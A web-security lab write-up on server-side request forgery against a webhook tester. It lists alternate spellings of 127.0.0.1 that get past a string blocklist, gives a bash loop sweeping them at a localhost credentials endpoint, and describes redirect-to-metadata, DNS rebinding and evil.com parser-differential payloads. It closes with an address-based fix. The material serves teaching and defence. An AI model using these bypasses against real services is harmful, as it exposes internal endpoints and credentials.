# Lab 26 — Webhook tester

## The bug

```python
host = (urllib.parse.urlsplit(url).hostname or "").lower()
for bad in BANNED:
    if bad in url.lower() or bad in host:
        return blocked
```

The check reads a **string**. The socket dials an **address**. Between them sits
a resolver that accepts many spellings of the same address, and a blocklist can
only ever enumerate the spellings its author remembered.

## The spellings of 127.0.0.1

```
2130706433          decimal (the whole 32-bit value)   ← this lab
0x7f000001          hex
017700000001        octal
127.1               short form: last octet fills the rest
0177.0.0.1          per-octet octal
0                   "this host" — resolves to 127.0.0.1
[::1]  [::ffff:127.0.0.1]  [0:0:0:0:0:ffff:7f00:1]     IPv6 spellings
localtest.me, 127.0.0.1.nip.io                          public DNS → 127.0.0.1
```

Try them in order and keep the list. On a real target one of them almost
always works:

```bash
for H in 2130706433 0177.0.0.1 127.1 0x7f.0.0.1 0 '[::1]'; do
  printf '%-14s ' "$H"
  h5i websec replay req_0 --session lab26 --create --reset-budget \
      --set path=/api/test --set "query.url=http://$H:9261/ops/credentials" |
    python3 -c 'import json,sys;print(json.load(sys.stdin)["response"]["status"])'
done
```

## The bypasses that are not about spelling

When the host really is checked properly, attack the *sequence* instead:

* **A redirect.** Give a URL on a host you own that answers `302 Location:
  http://169.254.169.254/…`. If the check runs on the submitted URL and the
  client follows redirects, the check is bypassed by construction.
* **DNS rebinding.** A name whose first resolution is public and whose second is
  `127.0.0.1`. Works whenever the code resolves once to validate and again to
  connect (the classic TOCTOU).
* **URL parser differentials.** `http://expected.com@evil.com/`,
  `http://evil.com#@expected.com/`, `http://expected.com\@evil.com/`. Different
  libraries disagree about where the host ends; the validator and the client are
  often different libraries.
* **A second, unfiltered feature.** Import-from-URL, avatar-from-URL, PDF
  renderer, webhook, "check my sitemap", SAML metadata, OpenID discovery.
  Filters are applied per-endpoint and endpoints are added by different people.

## The fix

Do not filter the string. Filter the **address you are about to connect to**:

```python
import ipaddress, socket
infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
addrs = {ipaddress.ip_address(i[4][0]) for i in infos}
if any(a.is_private or a.is_loopback or a.is_link_local or a.is_reserved for a in addrs):
    reject()
connect_to(addrs.pop())        # connect to the IP you checked, not the name
```

Connecting to the checked IP is the part that closes rebinding. Add: an
allowlist of destinations where the feature permits one, no redirects (or
re-check every hop), `http`/`https` only, and an egress policy in the network so
a mistake in this function is not the last line of defence.

## h5i technique

A sweep of candidate values through one `--set`, reading only the status — the
same three-line loop as Labs 06 and 09. Build it once; it is most of your
tooling.
